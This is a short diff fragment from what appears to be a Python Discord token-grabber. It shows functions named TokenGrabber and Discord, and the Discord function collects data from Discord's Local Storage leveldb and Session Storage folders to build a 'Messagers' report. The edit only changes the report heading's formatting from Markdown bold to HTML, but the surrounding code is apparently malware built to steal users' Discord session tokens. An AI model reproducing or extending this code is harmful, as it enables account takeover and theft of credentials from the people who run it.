@@ -63,7 +63,7 @@ def TokenGrabber(local, roaming):
 
 def Discord():
     msgInfo = ""
-    msgInfo+="\n\n\n**📬Messagers📬**"
+    msgInfo+="\n\n\n<b>📬Messagers📬</b>"
     dirs = [
         r'Local Storage\leveldb',
         r'Session Storage'
